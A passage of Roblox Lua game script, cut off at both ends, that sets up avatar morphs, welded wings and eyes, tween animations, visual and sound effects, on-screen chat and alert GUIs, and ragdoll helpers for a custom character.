cam:WaitForChild'rot'.Value = data.Rotation or Vector3.new(1,1,5)
cam:WaitForChild'pos'.Value = data.Position or Vector3.new(.5,.5,.5)
cam:WaitForChild'startdist'.Value = data.DropDist or 25;
cam:WaitForChild'enddist'.Value = data.IneffectiveDist or 150;

cam.Parent = who
wait()
cam.Disabled = false
wait(3)
cam:Destroy()
end
end)()
end

function CamShakeAll2(data)
for _,v in next, game:service'Players':players() do
CamShake2(v:FindFirstChildOfClass'PlayerGui' or v:FindFirstChildOfClass'Backpack' or v.Character,data)
end
end
--Camera Shake
--Animation Testing
function nonlerpanim(jointorweld,cframe,alpha,easestyle,easedirect)
local info = TweenInfo.new(alpha,easestyle,easedirect,0,false,0)
local actualanim = game:GetService("TweenService"):Create(jointorweld,info,{C0=cframe})
actualanim:Play()
return actualanim
end
function AnimateNormal(jointorweld,cframe,alpha,easestyle,easedirect)
local info = TweenInfo.new(alpha,easestyle,easedirect,0,false,0)
local actualanim = game:GetService("TweenService"):Create(jointorweld,info,{C0=cframe})
actualanim:Play()
return actualanim
end
function Animate(jointorweld,cframe,alpha,easestyle,easedirect,yield)
local info = TweenInfo.new(alpha,easestyle,easedirect,0,false,0)
local actualanim = RepTween:GetTweenObject(jointorweld,info,{C0=cframe})
if yield ~= nil then
actualanim:Play(yield)
else
actualanim:Play(false)
end
return actualanim
end
--stole from knotty lo
function TweenAnimate(object,Aniim,time,easingstyle,easingdirection,repet,reverse,deelay)
local infos=TweenInfo.new(time,Enum.EasingStyle[easingstyle],Enum.EasingDirection[easingdirection],repet,reverse,deelay)
local tween=game:GetService("TweenService"):Create(object,infos,Aniim)
tween:Play()
return tween
end
--Animation Testing

--Effect system
local EffectsDisabled = false

function DerpzEff(WhatEffModel,TweenInfoStff,OtherData)
if EffectsDisabled == false then

--local EffLocal = script.Effects.EffectLocal


local FXFolder = game: GetService("ReplicatedStorage").DERPZFX

local Eff = FXFolder:FindFirstChild(WhatEffModel):Clone()
Eff.Parent = sval.Char()
Eff.Anchored = true
Eff.CanCollide = false
Eff.Massless = true
local TweenInformation = TweenInfo.new(TweenInfoStff.Time,Enum.EasingStyle[TweenInfoStff.EasingStyle],Enum.EasingDirection[TweenInfoStff.EasingDirection],TweenInfoStff.RepeatCount,TweenInfoStff.Reverses,0)
Eff.Transparency = OtherData.Transparency
Eff.Size = OtherData.Size
Eff.Material = OtherData.Material
Eff.Reflectance = OtherData.Reflectance
Eff.CFrame = OtherData.CFrame
Eff.Color = OtherData.Color
--Goals and all that
local Goal = {}
Goal.CFrame = OtherData.EndCFrame
Goal.Color = OtherData.EndColor
Goal.Transparency = OtherData.EndTrans
Goal.Size = OtherData.EndSize
local tween = RepTween:GetTweenObject(Eff, TweenInformation, Goal)
--Goals and all that

--play
tween:Play()
local TimeNeeded = 1.1
if OtherData.Reverses == true then
TimeNeeded = 2
end
delay(TweenInfoStff.Time*TimeNeeded,function()
game.Debris:AddItem(Eff,0.001)
end)

else
--User has disabled effects.
end

end

--Effect system

--Morphs
-----------------Derpz-----------------
lol = script.JakeMorph["morph (Jake)"] lol.Name = "morph (Jake) for "..plr.Name lol.Parent = game:GetService("ServerStorage")
lol = script.DerpzMorph["morph (Derpz)"] lol.Name = "morph (Derpz) for "..plr.Name lol.Parent = game:GetService("ServerStorage")
if MorphedInto == "Derpz" then
local derpz = Character:GetChildren()
for i=1, #derpz do 
if (derpz[i].className == "Accessory") then 
-- derpz[i].Parent = nil
elseif (derpz[i].className == "Shirt") then
-- derpz[i].Parent = nil
elseif (derpz[i].className == "Pants") then
-- derpz[i].Parent = nil
elseif (derpz[i].className == "CharacterMesh") then
-- derpz[i].Parent = nil
elseif (derpz[i].className == "ShirtGraphic") then
-- derpz[i].Parent = nil

end 

end

local clothesa = game:GetService("ServerStorage")["morph (Derpz) for "..plr.Name]:Clone()
local clothes1 = clothesa:GetChildren()
for i=1, #clothes1 do 
if (clothes1[i].className == "Accessory") then 
clothes1[i].Parent = Character
elseif (clothes1[i].className == "Shirt") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "Pants") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "BodyColors") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "CharacterMesh") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "ShirtGraphic") then
clothes1[i].Parent = Character
end 

end
--else

--end
elseif MorphedInto == "Jake_D" then

local derpz = Character:GetChildren()
for i=1, #derpz do 
if (derpz[i].className == "Accessory") then 
derpz[i].Parent = nil
elseif (derpz[i].className == "Shirt") then
derpz[i].Parent = nil
elseif (derpz[i].className == "Pants") then
derpz[i].Parent = nil
elseif (derpz[i].className == "CharacterMesh") then
derpz[i].Parent = nil
elseif (derpz[i].className == "ShirtGraphic") then
derpz[i].Parent = nil

end 

end

local clothesa = game:GetService("ServerStorage")["morph (Jake) for "..plr.Name]:Clone()
local clothes1 = clothesa:GetChildren()
for i=1, #clothes1 do 
if (clothes1[i].className == "Accessory") then 
clothes1[i].Parent = Character
elseif (clothes1[i].className == "Shirt") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "Pants") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "BodyColors") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "CharacterMesh") then
clothes1[i].Parent = Character
elseif (clothes1[i].className == "ShirtGraphic") then
clothes1[i].Parent = Character
end 

end
end
local DerpzMorphLARM = script.DerpzMorph["L Arm"]
local finalweld3 = Instance.new("Weld",DerpzMorphLARM.main)
finalweld3.Part0 = DerpzMorphLARM.main
finalweld3.Part1 = larm
finalweld3.C0 = CFrame.new(0,-0.03,-0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"
local DerpzMorphRARM = script.DerpzMorph["R Arm"]
local finalweld3 = Instance.new("Weld",DerpzMorphRARM.main)
finalweld3.Part0 = DerpzMorphRARM.main
finalweld3.Part1 = rarm
finalweld3.C0 = CFrame.new(0,-0.03,-0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"
local DerpzMorphLLEG = script.DerpzMorph["L Leg"]
local finalweld3 = Instance.new("Weld",DerpzMorphLLEG.main)
finalweld3.Part0 = DerpzMorphLLEG.main
finalweld3.Part1 = lleg
finalweld3.C0 = CFrame.new(0,-0.045,-0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"
local DerpzMorphRLEG = script.DerpzMorph["R Leg"]
local finalweld3 = Instance.new("Weld",DerpzMorphRLEG.main)
finalweld3.Part0 = DerpzMorphRLEG.main
finalweld3.Part1 = rleg
finalweld3.C0 = CFrame.new(0,-0.045,-0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"
local DerpzMorphTORS = script.DerpzMorph["Tors"]
local finalweld3 = Instance.new("Weld",DerpzMorphTORS.main)
finalweld3.Part0 = DerpzMorphTORS.main
finalweld3.Part1 = tors
finalweld3.C0 = CFrame.new(0,-0.03,-0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"


DerpzVisor = script.DerpzMorph.Hed.Visor.main
local finalweld33 = Instance.new("Weld",DerpzVisor)
finalweld33.Part0 = DerpzVisor
finalweld33.Part1 = Head
finalweld33.C0 = CFrame.new(0,-.18,.65)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld33.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"


DerpzTail = script.DerpzMorph.Tail
local finalweld333 = Instance.new("Weld",DerpzTail.Main)
finalweld333.Part0 = DerpzTail.Main
finalweld333.Part1 = Torso
finalweld333.C0 = CFrame.new(0.222665405, 1.05234146, 0.358361816)*CFrame.Angles(math.rad(0),math.rad(180),math.rad(0))
finalweld333.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"
TailWeld = DerpzTail.Main.TailWeld


script.DerpzMorph.Parent = char


local DerpzMorph2LARM = script.DerpzMorph2["L Arm"]
local finalweld3 = Instance.new("Weld",DerpzMorph2LARM.main)
finalweld3.Part0 = DerpzMorph2LARM.main
finalweld3.Part1 = larm
finalweld3.C0 = CFrame.new(0,-0.03,-0.01)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"
local DerpzMorph2RARM = script.DerpzMorph2["R Arm"]
local finalweld3 = Instance.new("Weld",DerpzMorph2RARM.main)
finalweld3.Part0 = DerpzMorph2RARM.main
finalweld3.Part1 = rarm
finalweld3.C0 = CFrame.new(0,-0.03,-0.01)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"
local DerpzMorph2LLEG = script.DerpzMorph2["L Leg"]
local finalweld3 = Instance.new("Weld",DerpzMorph2LLEG.main)
finalweld3.Part0 = DerpzMorph2LLEG.main
finalweld3.Part1 = lleg
finalweld3.C0 = CFrame.new(0,-0.045,-0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"
local DerpzMorph2RLEG = script.DerpzMorph2["R Leg"]
local finalweld3 = Instance.new("Weld",DerpzMorph2RLEG.main)
finalweld3.Part0 = DerpzMorph2RLEG.main
finalweld3.Part1 = rleg
finalweld3.C0 = CFrame.new(0,-0.045,-0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"
local DerpzMorph2TORS = script.DerpzMorph2["Tors"]
local finalweld3 = Instance.new("Weld",DerpzMorph2TORS.main)
finalweld3.Part0 = DerpzMorph2TORS.main
finalweld3.Part1 = tors
finalweld3.C0 = CFrame.new(0,-0.03,-0.01)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"



script.DerpzMorph2.Parent = char




-----------------Derpz-----------------


-----------------Jake_D-----------------


local JakeMorphLARM = script.JakeMorph["L Arm"]
local finalweld3 = Instance.new("Weld",JakeMorphLARM.Main)
finalweld3.Part0 = JakeMorphLARM.Main
finalweld3.Part1 = larm
finalweld3.C0 = CFrame.new(0,-0.45,-0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"
local JakeMorphRARM = script.JakeMorph["R Arm"]
local finalweld3 = Instance.new("Weld",JakeMorphRARM.Main)
finalweld3.Part0 = JakeMorphRARM.Main
finalweld3.Part1 = rarm
finalweld3.C0 = CFrame.new(0,-0.45,-0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"
local JakeMorphLLEG = script.JakeMorph["L Leg"]
local finalweld3 = Instance.new("Weld",JakeMorphLLEG.Main)
finalweld3.Part0 = JakeMorphLLEG.Main
finalweld3.Part1 = lleg
finalweld3.C0 = CFrame.new(0,-0.045,-0)*CFrame.Angles(math.rad(0),math.rad(180),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"
local JakeMorphRLEG = script.JakeMorph["R Leg"]
local finalweld3 = Instance.new("Weld",JakeMorphRLEG.Main)
finalweld3.Part0 = JakeMorphRLEG.Main
finalweld3.Part1 = rleg
finalweld3.C0 = CFrame.new(0,-0.045,-0)*CFrame.Angles(math.rad(0),math.rad(180),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"
local JakeMorphTORS = script.JakeMorph["Tors"]
local finalweld3 = Instance.new("Weld",JakeMorphTORS.Main)
finalweld3.Part0 = JakeMorphTORS.Main
finalweld3.Part1 = tors
finalweld3.C0 = CFrame.new(0,-0.03,-0)*CFrame.Angles(math.rad(0),math.rad(180),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"


script.JakeMorph.Parent = char






-----------------Jake_D-----------------



-----------------Eyes------------------
--CFrame.new(.2,.2,-.2)
EyesFolder = script.Eyes
local finalweld3 = Instance.new("Weld",EyesFolder.LeftEye)
finalweld3.Part0 = EyesFolder.LeftEye
finalweld3.Part1 = Head
finalweld3.C0 = CFrame.new( 0.0984573364, -0.200519562, 0.586151123)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld3.C1 = CFrame.new(-0.49,0,-0.5)*CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"
local finalweld3 = Instance.new("Weld",EyesFolder.RightEye)
finalweld3.Part0 = EyesFolder.RightEye
finalweld3.Part1 = Head
finalweld3.C0 = CFrame.new( -0.0984573364, -0.200519562, 0.586151123)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
finalweld3.C1 = CFrame.new(0.49,0,-0.5)*CFrame.Angles(math.rad(0),math.rad(90),math.rad(0))
finalweld3.Name = "Weldiuehgiuewhguishgafgbsdgkfvjdhsagbk.sfk derpz's weld ok"

-----------------Eyes------------------
--Morphs

local NewInstance = function(instance,parent,properties)
local inst = Instance.new(instance,parent)
if(properties)then
for i,v in next, properties do
pcall(function() inst[i] = v end)
end
end
return inst;
end
MAINRUINCOLOR = BrickColor.new("Navy blue")
local Create = sval.FeLoadLib.Create
New = function(Object, Parent, Name, Data)
local Object = Instance.new(Object)
for Index, Value in pairs(Data or {}) do
Object[Index] = Value
end
Object.Parent = Parent
Object.Name = Name
return Object
end



--Rainbow Effects
function boop(X)
 return math.acos(math.cos(X*math.pi))/math.pi
 end

counter = 0
--Rainbow Effects










function CreateParta(parent,transparency,reflectance,material,brickcolor)
local p = Instance.new("Part")
p.TopSurface = 0
p.BottomSurface = 0
p.Parent = parent
p.Size = Vector3.new(0.1,0.1,0.1)
p.Transparency = transparency
p.Reflectance = reflectance
p.CanCollide = false
p.Locked = true
p.BrickColor = brickcolor
p.Material = material
return p
end

function CreateMesh(parent,meshtype,x1,y1,z1)
local mesh = Instance.new("SpecialMesh",parent)
mesh.MeshType = meshtype
mesh.Scale = Vector3.new(x1*10,y1*10,z1*10)
return mesh
end

function CreateSpecialMesh(parent,meshid,x1,y1,z1)
local mesh = Instance.new("SpecialMesh",parent)
mesh.MeshType = "FileMesh"
mesh.MeshId = meshid
mesh.Scale = Vector3.new(x1,y1,z1)
return mesh
end


function CreateSpecialGlowMesh(parent,meshid,x1,y1,z1)
local mesh = Instance.new("SpecialMesh",parent)
mesh.MeshType = "FileMesh"
mesh.MeshId = meshid
mesh.TextureId = "http://www.roblox.com/asset/?id=269748808"
mesh.Scale = Vector3.new(x1,y1,z1)
mesh.VertexColor = Vector3.new(parent.BrickColor.r, parent.BrickColor.g, parent.BrickColor.b)
return mesh
end

function CreateWeld(parent,part0,part1,C1X,C1Y,C1Z,C1Xa,C1Ya,C1Za,C0X,C0Y,C0Z,C0Xa,C0Ya,C0Za)
local weld = Instance.new("Weld")
weld.Parent = parent
weld.Part0 = part0
weld.Part1 = part1
weld.C1 = CFrame.new(C1X,C1Y,C1Z)*CFrame.Angles(C1Xa,C1Ya,C1Za)
weld.C0 = CFrame.new(C0X,C0Y,C0Z)*CFrame.Angles(C0Xa,C0Ya,C0Za)
return weld
end


function RemoveOutlines(part)
part.TopSurface, part.BottomSurface, part.LeftSurface, part.RightSurface, part.FrontSurface, part.BackSurface = 10, 10, 10, 10, 10, 10
end
function CreatePart(Parent, Material, Reflectance, Transparency, BColor, Name, Size)
local Part = Create("Part")({
Parent = Parent,
Reflectance = Reflectance,
Transparency = Transparency,
CanCollide = false,
Locked = true,
BrickColor = BrickColor.new(tostring(BColor)),
Name = Name,
Size = Size,
Material = Material
})
Part.CustomPhysicalProperties = PhysicalProperties.new(0.001, 0.001, 0.001, 0.001, 0.001)
RemoveOutlines(Part)
return Part
end
function CreateMesha(Mesh, Part, MeshType, MeshId, OffSet, Scale)
local Msh = Create(Mesh)({
Parent = Part,
Offset = OffSet,
Scale = Scale
})
if Mesh == "SpecialMesh" then
Msh.MeshType = MeshType
Msh.MeshId = MeshId
end
return Msh
end
function CreateWeld(Parent, Part0, Part1, C0, C1)
local Weld = Create("Weld")({
Parent = Parent,
Part0 = Part0,
Part1 = Part1,
C0 = C0,
C1 = C1
})
return Weld
end
Player = plr
Character=sval.Char() 
PlayerGui=Player.PlayerGui 
Backpack=Player.Backpack 
Torso=Character.Torso 
Head=Character.Head 
Humanoid=Character.Humanoid
m=Instance.new('Model',Character)
LeftArm=Character["Left Arm"] 
LeftLeg=Character["Left Leg"] 
RightArm=Character["Right Arm"] 
RightLeg=Character["Right Leg"] 
LS=Torso["Left Shoulder"] 
LH=Torso["Left Hip"] 
RS=Torso["Right Shoulder"] 
RH=Torso["Right Hip"] 
Neck=Torso.Neck
it=Instance.new
attacktype=1
vt=Vector3.new
cf=CFrame.new
euler=CFrame.fromEulerAnglesXYZ
angles=CFrame.Angles
cloaked=false
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
LHC0=cf(-1,-1,0,-0,-0,-1,0,1,0,1,0,0)
LHC1=cf(-0.5,1,0,-0,-0,-1,0,1,0,1,0,0)
RHC0=cf(1,-1,0,0,0,1,0,1,0,-1,-0,-0)
RHC1=cf(0.5,1,0,0,0,1,0,1,0,-1,-0,-0)
RootPart=Character.HumanoidRootPart
RootJoint=RootPart.RootJoint
RootCF=euler(-1.57,0,3.14)
attack = false 
attackdebounce = false 
deb=false
equipped=true
hand=false
MMouse=nil
combo=0
mana=0
trispeed=.2
attackmode='none'
local idle=0
local Anim="Idle"
local Effects={}
local gun=false
local shoot=false
local sine = 0
local change = 1

--Lunnekoo's Arm Weld Setup 
RSH, LSH=nil, nil
RW, LW=Instance.new("Weld"), Instance.new("Weld") 
RW.Name="Right Shoulder" LW.Name="Left Shoulder"
LH=Torso["Left Hip"]
RH=Torso["Right Hip"]
TorsoColor=Torso.BrickColor
function NoOutline(Part)
Part.TopSurface,Part.BottomSurface,Part.LeftSurface,Part.RightSurface,Part.FrontSurface,Part.BackSurface = 10,10,10,10,10,10
end
ch=Character
RSH=ch.Torso["Right Shoulder"] 
LSH=ch.Torso["Left Shoulder"] 
-- 
RSH.Parent=nil 
LSH.Parent=nil 
-- 
RW.Name="Right Shoulder"
RW.Part0=ch.Torso 
RW.C0=cf(1.5, 0.5, 0)
RW.C1=cf(0, 0.5, 0) 
RW.Part1=ch["Right Arm"] 
RW.Parent=ch.Torso 
-- 
LW.Name="Left Shoulder"
LW.Part0=ch.Torso 
LW.C0=cf(-1.5, 0.5, 0)
LW.C1=cf(0, 0.5, 0) 
LW.Part1=ch["Left Arm"] 
LW.Parent=ch.Torso 

local toggleTag = true
local txt = script.GuiStuff.MainName
txt.Parent = hed
txt.Name = "NameDetect"
text = txt.Main.Text
textgr = text.UIGradient
desc = txt.Desc
desctext = desc.textie
desctextgr = desctext.UIGradient
linegr = desc.Line.UIGradient
mainfr = txt.Main
img1 = mainfr.Heckers1
img2 = mainfr.Heckers2
img3 = mainfr.Heckers3

ModeOfCharacter = "Exasperation"

--GUI STUFF
gui = script.GuiStuff.Main
gui.Parent = plr.PlayerGui
MainFrame = gui.Main
NameOfScript = gui.NameOfScript
NameOfMode = gui.NameOfMode
SongNameTxt = MainFrame.SongName
OtherVisFrame = gui.OtherVisFrame

function swait(num)
if num == 0 or num == nil then
game:GetService("RunService").Stepped:Wait()
else
for i = 1, num do
game:GetService("RunService").Stepped:Wait()
end
end
end



coreweld = Instance.new("Motor6D",tors)
core = script.Core
core.Parent = char
coreweld.Part0 = tors
coreweld.Part1 = core.Core
coreweld.Name = "CoreWeld"
core.Core.Anchored = false
coreweld.C1 = CFrame.new(0,1.5,-1.2)*angles(math.rad(90),math.rad(0),math.rad(0))
LetterDW = core.Core.D
LetterDW.C0 = CFrame.new(0,0,0)*angles(math.rad(-90),math.rad(0),math.rad(0))
LetterDW.C1 = CFrame.new(0,0,0)
core1weld = core.Core.Color1b
core1weld.C0 = CFrame.new(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0))
core1weld.C1 = CFrame.new(0,0,0)
core2weld = core.Core.Color2b
core2weld.C0 = CFrame.new(0,0,0)*angles(math.rad(0),math.rad(45),math.rad(0))
core2weld.C1 = CFrame.new(0,0,0)
core3weld = core.Core.Color3b
core3weld.C0 = CFrame.new(0,0,0)*angles(math.rad(0),math.rad(45),math.rad(0))
core3weld.C1 = CFrame.new(0,0,0)


--[[DEFAULT WELDS
wing1weld.C1 = CFrame.new(0,0,-3)*angles(math.rad(-90),math.rad(0),math.rad(90))
wing2weld.C1 = CFrame.new(0,0,-5)*angles(math.rad(-90),math.rad(0),math.rad(90))
wing3weld.C1 = CFrame.new(0,0,-7)*angles(math.rad(-90),math.rad(0),math.rad(90))
wing4weld.C1 = CFrame.new(0,0,3)*angles(math.rad(-90),math.rad(0),math.rad(90))
wing5weld.C1 = CFrame.new(0,0,5)*angles(math.rad(-90),math.rad(0),math.rad(90))
wing6weld.C1 = CFrame.new(0,0,7)*angles(math.rad(-90),math.rad(0),math.rad(90))
]]


wing1weld = Instance.new("Motor6D",core.Core)
wing1 = script.Wing:Clone()
wing1.Parent = char
wing1weld.Part0 = core.Core
wing1weld.Part1 = wing1.Core
wing1.Core.Anchored = false
wing1weld.Name = "wing1weld"
wing1weld.C1 = CFrame.new(0,0,-3)*angles(math.rad(-90),math.rad(0),math.rad(90))


wing2weld = Instance.new("Motor6D",core.Core)
wing2 = script.Wing:Clone()
wing2.Parent = char
wing2weld.Part0 = core.Core
wing2weld.Part1 = wing2.Core
wing2.Core.Anchored = false
wing2weld.Name = "wing2weld"
wing2weld.C1 = CFrame.new(0,0,-5)*angles(math.rad(-90),math.rad(0),math.rad(90))


wing3weld = Instance.new("Motor6D",core.Core)
wing3 = script.Wing:Clone()
wing3.Parent = char
wing3weld.Part0 = core.Core
wing3weld.Part1 = wing3.Core
wing3.Core.Anchored = false
wing3weld.Name = "wing3weld"
wing3weld.C1 = CFrame.new(0,0,-7)*angles(math.rad(-90),math.rad(0),math.rad(90))

wing4weld = Instance.new("Motor6D",core.Core)
wing4 = script.Wing:Clone()
wing4.Parent = char
wing4weld.Part0 = core.Core
wing4weld.Part1 = wing4.Core
wing4.Core.Anchored = false
wing4weld.Name = "wing4weld"
wing4weld.C1 = CFrame.new(0,0,3)*angles(math.rad(-90),math.rad(0),math.rad(90))

wing5weld = Instance.new("Motor6D",core.Core)
wing5 = script.Wing:Clone()
wing5.Parent = char
wing5weld.Part0 = core.Core
wing5weld.Part1 = wing5.Core
wing5.Core.Anchored = false
wing5weld.Name = "wing5weld"
wing5weld.C1 = CFrame.new(0,0,5)*angles(math.rad(-90),math.rad(0),math.rad(90))

wing6weld = Instance.new("Motor6D",core.Core)
wing6 = script.Wing
wing6.Parent = char
wing6weld.Part0 = core.Core
wing6weld.Part1 = wing6.Core
wing6.Core.Anchored = false
wing6weld.Name = "wing6weld"
wing6weld.C1 = CFrame.new(0,0,7)*angles(math.rad(-90),math.rad(0),math.rad(90))



--Blink Functions
blinking = false
function blinkfunction()
if blinking == false then
blinking = true
coroutine.resume(coroutine.create(function()
--EyesFolder.RightEye.Size = Vector3.new(0.05, 0.082, 0.162)
--EyesFolder.LeftEye.Size = Vector3.new(0.05, 0.082, 0.162)
local tweenService = game:GetService("TweenService")

local tweeningInformation = TweenInfo.new(.3,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0.01)
local tweeningInformation2 = TweenInfo.new(.5,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0.01)

local partProperties = {
Size = Vector3.new(0.05, 0.082, 0.162);
}
local partProperties2 = {
Size = Vector3.new(0.05, 0.202, 0.162);
}

local Tween1 = RepTween:GetTweenObject(EyesFolder.LeftEye,tweeningInformation,partProperties):Play()
local Tween2 = RepTween:GetTweenObject(EyesFolder.RightEye,tweeningInformation,partProperties):Play()
--print("hurb")
wait(.4)
local Tween3 = RepTween:GetTweenObject(EyesFolder.LeftEye,tweeningInformation2,partProperties2):Play()
local Tween4 = RepTween:GetTweenObject(EyesFolder.RightEye,tweeningInformation2,partProperties2):Play()
wait(.6)
--print("bruh")
--EyesFolder.RightEye.Size = Vector3.new(0.05, 0.202, 0.162)
--EyesFolder.LeftEye.Size = Vector3.new(0.05, 0.202, 0.162)
end))
blinking = false
end
end
--Blink Functions




 
--Sound Effects
function soundeffect(id,pit,parent,vol,pos,name)
local sound = Instance.new("Sound")
sound.Parent = parent
sound.Name = name
sound.SoundId = "rbxassetid://"..id
sound.Pitch = pit
sound.Volume = vol
sound.TimePosition = pos
sound.PlayOnRemove = true
sound:Remove()
end

function soundeffectecho(id,pit,parent,vol,pos,name,times,timebetweenecho)
coroutine.resume(coroutine.create(function()
for i = 0,times do
local sound = Instance.new("Sound")
sound.Parent = parent
sound.Name = name
sound.SoundId = "rbxassetid://"..id
sound.Pitch = pit
sound.Volume = vol
sound.TimePosition = pos
sound.PlayOnRemove = true
sound:Remove()
wait(timebetweenecho)
end
end))
end

--Guis


function chatfunc(textie,speed,color,havestops,font1,font2)
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v==plr then
if v.PlayerGui:FindFirstChild("FillScrLocal")~= nil then
v.PlayerGui:FindFirstChild("FillScrLocal"):destroy()
end

thing = script.GuiStuff.ChatfuncLocal:Clone()
local success,fail = pcall(function()
if color:find("Rainbow") or color:find("Random") then
end
end)
if success then
thing.IsString.Value = true
thing.ColorSelect.Value = color
elseif not success then
thing.IsString.Value = false
thing.ColorValue.Value = color
end
thing.MorphedIntoName.Value = MorphedInto
thing.Text.Value = textie
thing.Speed.Value = speed
thing.OriginalPlayer.Value = plr.Name
thing.HasStops.Value = havestops
if font1 == nil then

thing.Font1.Value = "Arcade"
elseif font2 == nil then

thing.Font2.Value = "Arcade"
elseif font1 ~= nil and font2 ~= nil then
thing.Font1.Value = font1
thing.Font2.Value = font2
end

thing.Parent = v.PlayerGui
thing.Disabled = false
end
end
end


function FillScreen(color,timetowait)

for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.PlayerGui:FindFirstChild("FillScrLocal")~= nil then
v.PlayerGui:FindFirstChild("FillScrLocal"):destroy()
end

thing = script.GuiStuff.FillScrLocal:Clone()
thing.valuetowait.Value = timetowait
thing.Color.Value = color
thing.Parent = v.PlayerGui
thing.Disabled = false
end


end

function BossChatFuncTop(text,represfont,color,color2)
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.PlayerGui:FindFirstChild("TopBossChatLocal")~= nil then
v.PlayerGui:FindFirstChild("TopBossChatLocal"):destroy()
end

thing = script.GuiStuff.TopBossChatLocal:Clone()
thing.Font.Value = represfont
thing.Text.Value = text
thing.Color1.Value = color
thing.Color2.Value = color2
thing.Parent = v.PlayerGui
thing.Disabled = false
end
end

function Alert(valuetowait)
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.PlayerGui:FindFirstChild("AlertLocal")~= nil then
v.PlayerGui:FindFirstChild("AlertLocal"):destroy()
end

thing = script.GuiStuff.AlertLocal:Clone()
thing.valuetowait.Value = valuetowait
thing.Parent = v.PlayerGui
thing.Disabled = false
end
end



function getAttachment0(character, attachmentName)
for _,child in next,character:GetChildren() do
local attachment = child:FindFirstChild(attachmentName)
if attachment then
return attachment
end
end
end
 
function recurse(root,callback,i)
i= i or 0
for _,v in pairs(root:GetChildren()) do
i = i + 1
callback(i,v)
 
if #v:GetChildren() > 0 then
i = recurse(v,callback,i)
end
end
 
return i
end

weldfolder = Instance.new("Folder",workspace)
function weldBetween(part1,part2)
local ANewWeld = Instance.new("Weld",weldfolder)
ANewWeld.Part0 = part1
ANewWeld = part2
end
 function ArtificialHitbox(Part)
local HITBOX = CreatePart(3, Part, "Metal", 0, 1, "Really black", "Hitbox", Part.Size/2, false)
HITBOX.CanCollide = true
HITBOX.CFrame = Part.CFrame
weldBetween(Part,HITBOX)
end
function ragdollJoint(character, part0, part1, attachmentName, className, properties)
attachmentName = attachmentName.."RigAttachment"
local constraint = Instance.new(className.."Constraint")
constraint.Attachment0 = part0:FindFirstChild(attachmentName)
constraint.Attachment1 = part1:FindFirstChild(attachmentName)
constraint.Name = "RagdollConstraint"..part1.Name
 
for _,propertyData in next,properties or {} do
constraint[propertyData[1]] = propertyData[2]
end
 
constraint.Parent = character
end
function R15Ragdoll(character,KeepArms)
character:BreakJoints()
coroutine.resume(coroutine.create(function()
recurse(character, function(_,v)
if v:IsA("Attachment") then
v.Axis = Vector3.new(0, 1, 0)
v.SecondaryAxis = Vector3.new(0, 0, 1)
v.Rotation = Vector3.new(0, 0, 0)
end
end)
for _,child in next,character:GetChildren() do
if child:IsA("Accoutrement") then
for _,part in next,child:GetChildren() do
